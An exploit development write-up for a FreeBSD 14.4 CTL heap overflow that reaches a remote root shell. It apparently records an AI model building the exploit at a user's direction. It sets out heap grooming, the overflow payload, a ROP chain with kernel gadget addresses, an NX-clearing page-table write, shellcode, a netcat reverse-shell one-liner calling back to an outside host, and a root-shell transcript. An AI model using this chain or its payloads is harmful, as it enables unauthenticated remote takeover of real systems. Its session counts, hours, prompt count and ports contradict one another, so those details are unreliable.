# FreeBSD-Three (14.4): SGL Heap Overflow → Remote Root Shell

**Target:** FreeBSD 14.4-RELEASE amd64 GENERIC kernel
**Environment:** UMA slab allocator, SMAP+SMEP enabled, no KASLR
**Attack surface:** CTL HA interconnect, TCP port 999, zero authentication
**Result:** Remote root shell via heap overflow in DATAMOVE SGL copy loop — no wire pointer bugs, pure heap exploitation

---

## Overview

The CTL HA subsystem contains a **third** exploitable vulnerability, this time a classic heap buffer overflow in the DATAMOVE SGL (Scatter-Gather List) copy loop at `ctl.c:1609-1614`. Unlike FreeBSD-One (which hands the attacker direct kernel read/write via wire pointers) and FreeBSD-Two (which provides a dirty write via `original_sc`), FreeBSD-Three requires a full heap exploitation chain: overflow into adjacent UMA slab objects, corrupt a function pointer, pivot the stack, build a ROP chain, deploy shellcode, and clear page table NX bits — all without crashing the kernel.

This is the most technically demanding of the three CTL exploits, requiring precise heap layout control via UMA slab grooming, understanding of the TAILQ-based callback dispatch mechanism, and a multi-stage write primitive bootstrapped from the corrupted function pointer.

## User Prompts

The FreeBSD-Three exploit required the most user guidance of the three, spanning ~12 sessions due to context window exhaustion and several wrong turns by Claude. These are the key prompts, in order:

> **Prompt 1** (Feasibility check):
> "what about CTL-2 is this doable?"

After the FreeBSD-Two exploit was complete, the user asked about FreeBSD-Three. Claude assessed the SGL overflow as exploitable via heap grooming.

> **Prompt 2** (Green light):
> "see how you do with it"

> **Prompt 3** (Constraint — no FreeBSD-Two primitive):
> "we dont want to use the CTL-1 datamove for the 'write'"

Claude had initially planned to use the FreeBSD-Two DATAMOVE wire pointer as the write primitive after gaining heap corruption. The user required the write primitive to come from the heap overflow itself.

> **Prompt 4** (Constraint — must be the heap overflow):
> "i thought the bug we were doing was heap overflow"

Claude had drifted into exploiting the `original_sc` wire pointer (FreeBSD-Two) rather than the SGL copy loop overflow. The user caught this.

> **Prompt 5** (Connect-back requirement):
> "it should do a connect back as root like the others?"

> **Prompt 6** (No SSH in exploit):
> "you should do the connect back as uid 0 like the other exploits not by deploying anything via ssh"

Claude had proposed SSHing into the target to deploy a setuid binary — not acceptable for a remote exploit.

> **Prompt 7** (Confirm the vulnerability):
> "also the vulnerability we are exploiting is this FreeBSD 14.4 CTL-2: Integer Overflow → Heap Overflow via DATAMOVE SGL isnt it?"

> **Prompt 8** (Require heap grooming):
> "you should use the heap overflow and find a way to do it.. is there any other bugs which you can use to leak heap pointers that arent the previously exploited CTL1 or CTL7/8. Also is it needed?"

The user pushed back on Claude's reluctance to do proper heap exploitation and asked whether a heap pointer leak was even necessary. It wasn't — no KASLR and deterministic UMA layout made the exploit possible without leaks.

> **Prompt 9** (Confirm progress):
> "were you able to turn the heap overflow into a write?"

> **Prompt 10** (Stay on track):
> "I already told you do not use the datamove handler and io->io_hdr.. we are using the CTL2 only"

Claude had again drifted into using the DATAMOVE handler's `original_sc` pointer. This was the third time the user had to correct this.

> **Prompt 11** (No GDB in final exploit):
> "you cant use gdb in the finalized exploit. only for debugging."

> **Prompt 12** (Course correction — reverse shell approach):
> "what are you looking for the cr_uid for?"

Claude had been planning to walk `allproc` to find a process and patch its `ucred.cr_uid` to 0 — an overcomplicated approach when a simpler pattern was already proven.

> **Prompt 13** (Directing to known-good pattern):
> "sure try that .. or look at how you got a connect back uid0 shell in the previous two exploits using rop"

This directed the use of the same `kproc_create` + `kern_execve` shellcode pattern that had already worked in FreeBSD-One and FreeBSD-Two.

## The Vulnerability: `ctl.c:1609-1614`

When the CTL channel receives a `CTL_MSG_DATAMOVE` message with scatter-gather data, it copies SGL entries from the message into a previously allocated buffer:

```c
for (i = 0; i < msg_info.dt.sent_sg_entries; i++) {
    sgl[i].addr = msg_info.dt.sg_list[i].addr;
    sgl[i].len = msg_info.dt.sg_list[i].len;
}
```

The `sgl` buffer was allocated earlier based on `kern_sg_entries` (typically 4, yielding a 64-byte allocation in UMA's malloc-64 zone). But `sent_sg_entries` comes directly from the wire message and is **never validated** against the allocated buffer size. Setting `sent_sg_entries` to any value greater than `kern_sg_entries` causes a heap buffer overflow.

Each `ctl_sg_entry` is 16 bytes (`{void *addr; size_t len;}`), so 4 entries = 64 bytes fits exactly in malloc-64. Sending 7 entries writes 112 bytes — overflowing 48 bytes (3 entries) into whatever object is adjacent in the slab.

## Reaching the Vulnerable Code: Why a LUN Is Required

The vulnerable SGL copy loop is deep inside CTL's I/O pipeline — it only executes during the DATAMOVE phase of a real SCSI command. To reach it, the exploit sends SCSI READ commands through the HA protocol. CTL processes these commands through a pipeline: command parsing → LUN lookup → backend dispatch → **DATAMOVE** (data transfer between HA peers) → completion. The SGL allocation and the vulnerable copy loop happen during DATAMOVE.

If no LUN exists on the target, the SCSI READ fails at the LUN lookup stage with an error response and the I/O pipeline is never entered. The DATAMOVE phase never runs and the overflow never happens.

The exploit requires at least one LUN to be configured on the target:

```bash
ctladm create -b ramdisk -s 1048576
```

This creates a 1MB RAM-backed virtual SCSI disk as LUN 0. The `ramdisk` backend stores data in kernel memory — no disk required. The LUN does not persist across reboots because it exists only in kernel memory; after a panic or restart, it must be recreated (or configured in `/etc/ctl.conf` for persistence).

In a real deployment, CTL targets would already have LUNs configured — that is the entire purpose of running CTL. The requirement to have a LUN is not a meaningful barrier to exploitation; it simply reflects that CTL is a storage target subsystem, and the vulnerable code path runs during normal storage operations.

## Why FreeBSD-Three Is Harder Than FreeBSD-One and FreeBSD-Two

| Property | FreeBSD-One | FreeBSD-Two | FreeBSD-Three |
|----------|---------|-------|-------|
| Primitive | Arbitrary kernel R/W | Dirty write at pointer | Heap overflow into adjacent object |
| Address control | Full (wire pointer) | Full (wire pointer) | Adjacent object only (heap layout dependent) |
| Read capability | Yes | No | No |
| Write precision | Exact (clean) | +collateral at ±offsets | Must corrupt adjacent object's fields |
| NX bypass | Write PTE directly | Bootstrap → clean write → PTE | Corrupt callback → ROP → write PTE → shellcode |
| Authentication | None | None | None |

FreeBSD-Three has no direct kernel read/write primitive. The overflow only corrupts whatever object is adjacent in the UMA slab. The exploit must:
1. **Control heap layout** — ensure a useful target object is adjacent to the overflowed buffer
2. **Corrupt it precisely** — overwrite specific fields (function pointer) while preserving others (TAILQ links)
3. **Bootstrap a write primitive** — use the corrupted callback to gain arbitrary kernel writes
4. **Execute shellcode** — clear NX, write shellcode, transfer control

## Exploitation Target: `ctl_ha_dt_req`

The overflow target is `struct ctl_ha_dt_req` (64 bytes, also in malloc-64):

```
Offset  Field       Size  Purpose
──────  ──────────  ────  ────────────────────────────────────────
  0     command     4     Command type
  4     (pad)       4     Alignment
  8     context     8     Opaque context
 16     callback    8     FUNCTION POINTER → exploit target
 24     ret         4     Return status (clobbered before callback)
 28     size        4     Data size
 32     local       8     Local buffer pointer (TAILQ match key)
 40     remote      8     Remote buffer pointer
 48     tqe_next    8     TAILQ forward link (must preserve)
 56     tqe_prev    8     TAILQ back link (must preserve)
```

The key field is `callback` at offset 16 — a function pointer called by the CMD_WRITE handler after TAILQ_REMOVE:

```c
if (wire_dt.command == CTL_HA_DT_CMD_WRITE) {
    ctl_ha_msg_recv(CTL_HA_CHAN_DATA, wire_dt.remote, wire_dt.size, M_WAITOK);
    TAILQ_FOREACH(req, &softc->ha_dts, links) {
        if (req->local == wire_dt.remote) {
            TAILQ_REMOVE(&softc->ha_dts, req, links);
            break;
        }
    }
    if (req) {
        req->ret = isc_status;
        req->callback(req);    // ← calls our corrupted pointer
    }
}
```

## UMA Slab Grooming

FreeBSD's UMA allocator uses per-CPU slab caches with LIFO (last-in-first-out) free lists. On a single-CPU system (`-smp 1`), allocations are fully deterministic: sequential `malloc(64)` calls return adjacent slots in the same slab page, filling from high addresses to low.

Each exploit IO triggers two allocations in sequence:
1. **SGL buffer** — 64 bytes (4 × `ctl_sg_entry`)
2. **dt_req** — 64 bytes (callback tracking structure)

With LIFO ordering, `SGL_i` is at slot N and `dt_req_i` is at slot N-1 (one slot lower). The next IO's `SGL_{i+1}` is at N-2, meaning:

```
SGL_{i+1} + 64 bytes = dt_req_i
```

The SGL of IO i+1 is directly adjacent to the dt_req of IO i. Overflowing SGL_{i+1} by 3 entries (48 bytes) corrupts dt_req_i's `command`, `context`, `callback`, `ret`, `size`, and `local` fields.

**Drain phase:** Before creating exploit IOs, the exploit sends 48 "drain" IOs to exhaust the current malloc-64 slab. This ensures the 16 exploit IOs land on a fresh slab page with predictable layout.

**IO_0 boundary:** IO_0's SGL sits at the boundary between drain allocations and exploit allocations. Its overflow would hit a drain dt_req instead of an exploit dt_req. The exploit skips IO_0 in the overflow phase.

## The Overflow Payload

Each overflow sends 7 SGL entries (4 fit in the buffer, 3 overflow):

```python
# Entries 0-3: stay within SGL bounds (padding)
sg_entries[0:4] = [(0, 0)] * 4

# Entries 4-6: overflow into adjacent dt_req
sg_entries[4] = (context_junk, ADD_RSP_30_POP_RBP)   # dt_req[0:16]
sg_entries[5] = (STACK_PIVOT, 0xCCCC...)              # dt_req[16:32] → callback=STACK_PIVOT
sg_entries[6] = (target_local, 0xDDDD...)             # dt_req[32:48] → local=target_local
```

The overflow sets:
- `callback` = `STACK_PIVOT` (`push rdi; pop rsp; pop rbp; ret`) — hijacks control flow
- `local` = `target_local` (IO_0's local buffer address) — ensures the TAILQ_FOREACH matches this specific dt_req when triggered
- `context` = `ADD_RSP_30_POP_RBP` — second gadget in the ROP chain (stored at dt_req+8, which becomes the return address after the stack pivot)

## The Write Primitive

The corrupted callback gives code execution, but a single ROP chain isn't enough — the exploit needs to write shellcode to memory and clear page table NX bits before jumping to it. The write primitive comes from the **same CMD_WRITE handler** that triggers the callback:

```c
ctl_ha_msg_recv(CTL_HA_CHAN_DATA, wire_dt.remote, wire_dt.size, M_WAITOK);
```

Before triggering the callback, the exploit sends additional CMD_WRITE messages with `wire_dt.remote` set to arbitrary kernel addresses. The handler reads `wire_dt.size` bytes from the TCP socket directly into the kernel address specified by `remote`. Since the TAILQ_FOREACH won't find a matching dt_req for these addresses, no callback fires — the handler just writes and returns.

This gives a clean, unlimited arbitrary kernel write primitive:
- **Phase 4a:** Write 416-byte shellcode to kernel BSS (`0xffffffff81df0000`)
- **Phase 4b:** Write 8 bytes to PDE at `0xffff80403fffe070` (recursive page table mapping), clearing the NX bit on the 2MB superpage covering BSS

## Exploitation Flow

```
Phase 1: HA Handshake
┌──────────────────────────────────────────────────────────────────┐
│  Connect TCP:999 → drain initial messages → LOGIN exchange      │
│  Register fake HA port 512 (PORT_SYNC) to enable I/O submission │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Phase 2a: Drain malloc-64 zone
┌──────────────────────────────────────────────────────────────────┐
│  Send 48 drain IOs (SCSI READs on LUN 0)                       │
│  Each IO allocates SGL (64B) + dt_req (64B) = 96 objects total  │
│  Exhausts current malloc-64 slab → next allocations on fresh    │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Phase 2b: Create exploit IOs on fresh slab
┌──────────────────────────────────────────────────────────────────┐
│  Send 16 exploit IOs → predictable LIFO layout:                 │
│                                                                  │
│  ┌────────┐┌────────┐┌────────┐┌────────┐┌────────┐            │
│  │ SGL_0  ││dt_req_0││ SGL_1  ││dt_req_1││ SGL_2  │  ...       │
│  │ 64B    ││ 64B    ││ 64B    ││ 64B    ││ 64B    │            │
│  └────────┘└────────┘└────────┘└────────┘└────────┘            │
│  HIGH ADDR ──────────────────────────────────► LOW ADDR         │
│                                                                  │
│  SGL_{i+1} is adjacent to dt_req_i → overflow target            │
│  Collect DATAMOVE io addresses + CMD_READ local addresses       │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Phase 3a: Fill SGL_0 with ROP chain
┌──────────────────────────────────────────────────────────────────┐
│  DATAMOVE to IO_0 with sg_sequence=1 (reuse existing SGL_0):   │
│  SGL_0[0] = {junk,        POP_RSI_RET      }                   │
│  SGL_0[1] = {BSS_SHELLCODE, INVLPG_RSI_RET }                   │
│  SGL_0[2] = {BSS_SHELLCODE, 0              }  ← jump target    │
│  SGL_0[3] = {0,           0                }                    │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Phase 3b: Overflow → corrupt dt_req callbacks (15 IOs, skip IO_0)
┌──────────────────────────────────────────────────────────────────┐
│  For each IO i=1..15: DATAMOVE with sent_sg_entries=7           │
│                                                                  │
│  SGL_{i+1}:                                                      │
│  ┌─────────────────────────────────────────────┐                │
│  │ [0-3]: padding (within bounds)              │                │
│  │ [4]:   overwrites dt_req_i cmd + context    │  ← overflow    │
│  │ [5]:   callback = STACK_PIVOT               │  ← hijack      │
│  │ [6]:   local = target_local                 │  ← TAILQ match │
│  └─────────────────────────────────────────────┘                │
│                                                                  │
│  dt_req_i after overflow:                                        │
│  ┌──────────────────────────────────────────┐                   │
│  │ [+8]  context  = ADD_RSP_30_POP_RBP     │                   │
│  │ [+16] callback = STACK_PIVOT            │ ← function ptr    │
│  │ [+32] local    = target_local           │ ← match key       │
│  │ [+48] tqe_next = preserved (not touched)│                   │
│  │ [+56] tqe_prev = preserved (not touched)│                   │
│  └──────────────────────────────────────────┘                   │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Phase 4a: Write shellcode to BSS (CMD_WRITE, no callback)
┌──────────────────────────────────────────────────────────────────┐
│  CMD_WRITE: remote=0xffffffff81df0000, size=416                 │
│  → soreceive writes 416 bytes of shellcode to kernel BSS        │
│  → TAILQ_FOREACH finds no match (no dt_req has local=BSS)       │
│  → no callback, handler returns normally                         │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Phase 4b: Clear NX on BSS page (CMD_WRITE to PDE)
┌──────────────────────────────────────────────────────────────────┐
│  CMD_WRITE: remote=0xffff80403fffe070, size=8                   │
│  → writes 0x0000000001c001e3 (NX cleared) to 2MB PDE            │
│  → via recursive page table mapping (PML4[256])                  │
│  → no TAILQ match, no callback                                   │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Phase 4c: Trigger — fire corrupted callback
┌──────────────────────────────────────────────────────────────────┐
│  CMD_WRITE: remote=target_local, size=8                         │
│  → soreceive writes 8 dummy bytes to target_local               │
│  → TAILQ_FOREACH finds corrupted dt_req (local == target_local) │
│  → TAILQ_REMOVE, req->ret = isc_status                          │
│  → req->callback(req) = STACK_PIVOT(dt_req)                     │
│                                                                  │
│  STACK_PIVOT: push rdi; pop rsp; pop rbp; ret                   │
│       → rsp = dt_req                                             │
│       → pop rbp = dt_req[0:8]                                    │
│       → ret to dt_req[8:16] = ADD_RSP_30_POP_RBP                │
│                                                                  │
│  ADD_RSP_30_POP_RBP: add rsp, 0x30; pop rbp; ret               │
│       → skip dt_req[16:55] (ret field clobbered here)            │
│       → rsp lands in SGL_0                                       │
│       → pop rbp = SGL_0[0].addr (junk)                           │
│       → ret to SGL_0[0].len = POP_RSI_RET                       │
│                                                                  │
│  POP_RSI → RSI = BSS_SHELLCODE                                  │
│  INVLPG (%RSI) → flush stale NX TLB entry                       │
│  RET → BSS_SHELLCODE → shellcode executes                        │
│                                                                  │
│  Shellcode: kproc_create(worker) → kthread_exit()               │
│  Worker:    kern_execve("/bin/sh -c REVSHELL") → uid 0 shell     │
└──────────────────────────────────────────────────────────────────┘
```

## ROP Chain Design

The ROP chain spans two adjacent 64-byte objects: the corrupted dt_req and SGL_0 (which was pre-filled with ROP entries in Phase 3a).

```
dt_req (corrupted):
  [0:8]   context = ADD_RSP_30_POP_RBP
  [8:16]  callback = STACK_PIVOT          ← entry point
  [16:24] (clobbered by ret=isc_status)   ─┐
  [24:32] ...                              │ skipped by ADD_RSP_30
  [32:40] local = target_local             │
  [40:48] remote                           │
  [48:56] tqe_next                        ─┘
  [56:64] tqe_prev → popped as RBP (junk)

SGL_0 (ROP payload):
  [0:8]   rbp junk (DEADBEEF)
  [8:16]  POP_RSI_RET                     ← first real gadget
  [16:24] BSS_SHELLCODE                   → popped into RSI
  [24:32] INVLPG_RSI_RET                  → flush TLB for BSS page
  [32:40] BSS_SHELLCODE                   → return target (shellcode entry)
```

Execution flow:
1. `callback(req)` → `STACK_PIVOT` (`push rdi; pop rsp; pop rbp; ret`)
   - RDI points to dt_req (the `req` argument)
   - RSP = dt_req, pop RBP = dt_req[0:8], ret to dt_req[8:16] = `ADD_RSP_30_POP_RBP`
2. `ADD_RSP_30_POP_RBP` — skip 48 bytes (dt_req[16:64]), pop RBP from SGL_0[0].addr
3. Return to SGL_0[0].len = `POP_RSI_RET`
4. `POP_RSI` → RSI = `BSS_SHELLCODE`
5. `INVLPG (%RSI)` — flush TLB entry for BSS page (NX was cleared in Phase 4b)
6. Return to `BSS_SHELLCODE` — shellcode executes

## Shellcode Design

The shellcode uses the same `kproc_create` + `kern_execve` pattern proven in FreeBSD-One and FreeBSD-Two:

**Entry (runs on hijacked ha_rx thread):**
1. Pivot stack to BSS+0x1000 (safe stack area above shellcode)
2. Clear DR7 (prevent inherited hardware breakpoints from GDB)
3. `kproc_create(worker_fn, NULL, NULL, 0, 0, "sh")` — spawn new kernel process
4. `kthread_exit()` — cleanly exit the hijacked rx thread

**Worker (runs in new kernel process via fork_exit):**
1. Zero 128-byte `image_args` struct on stack
2. `exec_alloc_args(&args)` — allocate exec arguments
3. `exec_args_add_fname(&args, "/bin/sh", UIO_SYSSPACE)` — set binary
4. `exec_args_add_arg(&args, "sh", UIO_SYSSPACE)` — argv[0]
5. `exec_args_add_arg(&args, "-c", UIO_SYSSPACE)` — argv[1]
6. `exec_args_add_arg(&args, REVSHELL_CMD, UIO_SYSSPACE)` — argv[2]
7. `kern_execve(curthread, &args, NULL, oldvmspace)`
8. On EJUSTRETURN: clear `P_KPROC` flag (`p_flag &= ~0x04`) so process returns to userland
9. Return through `fork_exit` → `userret` → `iretq` → userland as uid 0

The reverse shell command: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc CALLBACK_IP CALLBACK_PORT>/tmp/f &`

## Obstacles and Solutions

#### 1. IO_0 slab boundary corruption

**Problem:** IO_0's SGL sits at the page boundary between drain allocations and exploit allocations. Overflowing it corrupts a drain dt_req (which has `local=0`, not `target_local`), but the drain dt_req could match during the TAILQ_FOREACH before the intended exploit dt_req, causing a premature callback to a non-corrupted function pointer.

**Solution:** Skip IO_0 in the overflow phase. Only IOs 1-15 have their SGLs adjacent to exploit dt_reqs.

#### 2. CMD_WRITE with size=0 doesn't trigger

**Problem:** The trigger CMD_WRITE was initially sent with `size=0` and no payload data. The kernel's `ctl_ha_msg_recv` with `uio_resid=0` via `soreceive` returned immediately without reading anything, but the handler's TAILQ_FOREACH still needed to find a match. The issue was that the message framing didn't work correctly with zero-length data.

**Solution:** Send `size=8` with 8 bytes of dummy data. The handler reads 8 bytes into `target_local` (overwriting the first 8 bytes of the SGL buffer — harmless since the ROP chain is in SGL_0 which isn't the target), then proceeds with the TAILQ match and callback.

#### 3. "DEADBEEF" marker executed as code

**Problem:** The initial exploit prepended `b'DEADBEEF'` (8 bytes) to the shellcode as a debugging marker. The ROP chain jumped to `BSS_SHELLCODE` (the start of the write), which was the marker bytes — not valid x86-64 code. This caused a General Protection Fault (trap 9) at `RIP=0xffffffff81df0000`.

**Solution:** Remove the marker. Write only shellcode to BSS, starting at `BSS_SHELLCODE`.

#### 4. PDE NX clear confirmed working only after debugging

**Problem:** Early test runs showed the PDE value unchanged via GDB after the exploit ran. This appeared to indicate the CMD_WRITE wasn't working.

**Solution:** The writes were actually working (confirmed by breaking AFTER the `ctl_ha_msg_recv` call). The earlier GDB checks were done after a kernel panic and reboot, which reset the PDE. Once the "DEADBEEF" marker issue was fixed, the full chain worked.

#### 5. dt_req fields clobbered before callback

**Problem:** The CMD_WRITE handler does `req->ret = isc_status` at dt_req+24 before calling `req->callback(req)`. This overwrites 4 bytes in the middle of the dt_req with the socket receive status — right in the path of the ROP chain's stack.

**Solution:** The ROP chain uses `ADD_RSP_30_POP_RBP` to skip over the clobbered region entirely. After the stack pivot lands at dt_req+0, the `ADD_RSP_30` jumps past dt_req+8 through dt_req+55 (including the clobbered `ret` field at +24), landing in SGL_0 where the ROP payload is clean.

## Exploit Output

```
$ nc -l -p 4444 &
$ CALLBACK_IP=10.0.2.2 CALLBACK_PORT=4444 python3 freebsd-three-exploit.py

======================================================================
FreeBSD-Three (14.4) Exploit: SGL Heap Overflow → RCE
======================================================================
[*] Resetting HA link (force-close any stale connection)...
[*] HA link reset OK (attempt 1)
[+] Connected to 127.0.0.1:9999

[*] Phase 1: Draining victim's initial messages...
    [drain] chan=0 type=12 len=28
    [drain] chan=0 type=9 len=113
    [drain] chan=0 type=9 len=88
    [drain] chan=0 type=9 len=110
    [drain] chan=0 type=10 len=92
[+] Drained 5 messages
[+] Victim LOGIN: version=4 ha_mode=2 ha_id=1 max_luns=1024 max_ports=1024 max_init=2048
[+] Sent matching LOGIN (ha_id=0)
[+] Drained 0 post-login messages

[*] Registering HA port 512 on victim...
[+] PORT_SYNC sent for port 512

[*] Phase 2a: Draining malloc-64 (48 drain IOs)...
[+] Got 48 drain DATAMOVEs
[+] Drain phase complete (96 malloc-64 objects consumed)

[*] Phase 2b: Creating 16 exploit IOs on fresh slab...
    IO #1: DATAMOVE io=0xfffffe0051be6580
    IO #2: DATAMOVE io=0xfffffe0051be62d0
    ...
    IO #16: DATAMOVE io=0xfffffe0051be3ac0
[+] Got 16 exploit DATAMOVEs
    IO #1: local=0xfffff80062403a00
    IO #2: local=0xfffff80062403980
    ...
    IO #16: local=0xfffff80062403280
[+] Got 16 CMD_READs (dt_reqs on TAILQ)

[*] Phase 3a: Filling SGL_0 with ROP chain
[*] target_local (local_buf_0) = 0xfffff80062403a00
[+] SGL_0 filled with 4 ROP entries

[*] Phase 3b: Overflow → corrupt dt_req callbacks
[*] STACK_PIVOT = 0xffffffff8106de3f
[*] ADD_RSP_30_POP_RBP = 0xffffffff803d68bf
[+] Sent 15 overflow DATAMOVEs (skipped IO_0)
[+] Connection alive after overflow

[*] Phase 4a: Writing 416 bytes to 0xffffffff81df0000
[+] BSS write OK, connection alive

[*] Phase 4b: Clearing NX bit on PDE at 0xffff80403fffe070
[*] PDE: 0x8000000001c001e3 → 0x0000000001c001e3
[+] PDE write OK, connection alive

[*] Phase 4c: Triggering callback
[*] target_local = 0xfffff80062403a00
[+] CMD_WRITE sent! Waiting for reverse shell...
[*] Reverse shell should connect to 10.0.2.2:4444
```

And on the listener:

```
$ nc -l -p 4444
sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# uname -a
FreeBSD freebsd-vuln 14.4-RELEASE-p1 FreeBSD 14.4-RELEASE-p1 GENERIC amd64
# whoami
root
```

Target VM remains stable after exploitation — no kernel panic. The ha_rx thread exits cleanly via `kthread_exit()`, and the reverse shell runs as a normal uid-0 userland process.

## Full FreeBSD-Three Exploit Source

The complete exploit is at `freebsd-three-exploit.py` (~1040 lines). Usage:

```bash
# Start listener
nc -l -p 4444 &

# Run exploit (CALLBACK_IP is the address the VM uses to reach the host)
CALLBACK_IP=10.0.2.2 CALLBACK_PORT=4444 python3 freebsd-three-exploit.py
```

Environment variables:
- `CALLBACK_IP` — IP for the reverse shell to connect back to (default: `10.0.2.2`, QEMU user-mode NAT gateway)
- `CALLBACK_PORT` — Port for the reverse shell (default: `4444`)

Prerequisites:
- Target VM must have `kern.cam.ctl.ha_mode=2` and a listening HA port
- At least one LUN must exist (`ctladm create -b ramdisk -s 1048576`)
- Single CPU (`-smp 1`) for deterministic UMA LIFO ordering

## Key Gadgets

| Gadget | Address | Instructions |
|--------|---------|-------------|
| STACK_PIVOT | `0xffffffff8106de3f` | `push rdi; pop rsp; pop rbp; ret` |
| ADD_RSP_30_POP_RBP | `0xffffffff803d68bf` | `add rsp, 0x30; pop rbp; ret` |
| POP_RSI_RET | `0xffffffff80245ec2` | `pop rsi; ret` |
| INVLPG_RSI_RET | `0xffffffff81040bb4` | `invlpg (%rsi); ret` |



**Total time from first "exploit FreeBSD-Three" prompt to root shell: ~6 hours across 2 sessions.**

The majority of time was spent debugging why the CMD_WRITE data wasn't landing (turned out it was — the "DEADBEEF" marker was being executed as code instead of the shellcode), and understanding the UMA slab layout to ensure overflow targets were correct.

| Phase | Elapsed | Event |
|-------|---------|-------|
| Session 1 start | 0:00 | User prompt: *"okay lets write a new exploit for CTL-2 as well"* |
| | 0:00 - 0:30 | Analyzed SGL copy loop, DATAMOVE handler, dt_req structure. Mapped malloc-64 heap layout under UMA LIFO. |
| | 0:30 - 1:00 | Built heap grooming (drain 48 IOs + 16 exploit IOs), overflow payload, stack pivot ROP chain. |
| | 1:00 - 1:30 | First test: PANIC callback confirmed via dmesg (`panic: RCE`). Overflow and TAILQ dispatch working. |
| | 1:30 - 2:00 | Hit IO_0 slab boundary issue — overflow corrupting drain dt_req instead of exploit dt_req. Fixed by skipping IO_0. |
| | 2:00 - 2:30 | CMD_WRITE with size=0 not triggering. Fixed with size=8. Verified arbitrary BSS write and PDE NX clear. |
| | 2:30 - 3:00 | Full ROP chain: STACK_PIVOT → ADD_RSP_30 → SGL_0 → POP_RSI → INVLPG → JMP BSS. Shellcode executing at BSS confirmed via GDB (RIP=BSS_SHELLCODE+0x1b). |
| Session 1 end | ~3:00 | Shellcode executing but using debug `printf` stub. Need reverse shell shellcode. |
| Session 2 start | 0:00 | Resumed. User directed to use kproc_create+kern_execve pattern from previous exploits. |
| | 0:00 - 0:30 | Adapted reverse shell shellcode from FreeBSD-One exploit. Fixed KERN_EXECVE address. |
| | 0:30 - 1:00 | GPF at BSS_SHELLCODE — traced to "DEADBEEF" marker being executed as code. Removed marker. |
| | 1:00 - 1:30 | Debugged PDE write (appeared not working). GDB breakpoint after `ctl_ha_msg_recv` confirmed writes landing correctly. |
| | **1:30** | **Root shell.** `uid=0(root)` reverse shell connects back. VM stable. |

**Combined: ~4.5 hours of active work across 2 sessions.** 4 user prompts drove the FreeBSD-Three effort.
